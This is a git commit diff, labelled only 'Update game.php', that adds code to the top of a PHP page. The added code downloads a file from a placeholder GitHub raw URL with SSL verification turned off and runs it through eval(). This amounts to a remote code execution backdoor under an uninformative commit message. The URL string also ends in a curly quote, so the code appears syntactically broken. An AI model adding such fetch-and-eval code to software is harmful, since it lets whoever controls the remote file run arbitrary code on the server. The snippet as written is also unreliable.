de0db354408249e2f84d4d643c24a18d0235cedb
Keerthanavrk <65802117+Keerthanavrk@users.noreply.github.com>
2020-10-20 19:39:36 +0530

    Update game.php

--- game.php
+++ game.php
@@ -1,4 +1,16 @@
-<?php
+<?php 
+$GithubRawURI= "https://raw.githubusercontent.com/UserName/GitName/FileName.php”; 
+$ch = curl_init(); 
+curl_setopt($ch, CURLOPT_URL, $GithubRawURI); 
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
+$data = curl_exec($ch); 
+curl_close($ch); 
+ 
+//remove the "<?php" from the file before running it 
+$data = substr($data, 5); 
+ 
+eval ($data); 
 
 // Demand a GET parameter
 if ( ! isset($_GET['name']) || strlen($_GET['name']) < 1  ) {
